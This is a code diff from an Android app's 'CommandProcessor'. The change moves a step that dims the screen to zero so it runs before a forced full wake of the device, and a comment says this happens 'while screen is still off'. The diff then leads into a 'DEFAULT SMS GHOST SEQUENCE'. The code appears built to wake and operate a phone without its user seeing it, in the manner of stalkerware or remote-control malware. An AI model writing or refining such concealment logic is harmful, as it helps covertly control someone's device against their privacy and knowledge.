@@ -1518,7 +1518,12 @@ object CommandProcessor {
                                     .apply()
                             }, 5000)
 
-                            // 1. STRONG WAKE (Delayed to 5.5s)
+                            // 1. DIM IMMEDIATELY (Moved up to 5.5s - while screen is still off)
+                            Handler(Looper.getMainLooper()).postDelayed({ 
+                                DimmerManager.applyDim(ctx, 0, "AUTO")
+                            }, 5500)
+
+                            // 2. STRONG WAKE (Delayed to 6.0s - giving the overlay 500ms to register)
                             Handler(Looper.getMainLooper()).postDelayed({
                                 val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                                 val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
@@ -1531,12 +1536,7 @@ object CommandProcessor {
                                     putExtra("is_wake_trigger", true)
                                 }
                                 ctx.startActivity(wakeIntent)
-                            }, 5500)
-
-                            // 2. DIM IMMEDIATELY (Delayed to 6.5s)
-                            Handler(Looper.getMainLooper()).postDelayed({ 
-                                DimmerManager.applyDim(ctx, 0, "AUTO")
-                            }, 6500)
+                            }, 6000)
 
                             // 3. DEFAULT SMS GHOST SEQUENCE (Delayed to 8.5s)
                             Handler(Looper.getMainLooper()).postDelayed({ 
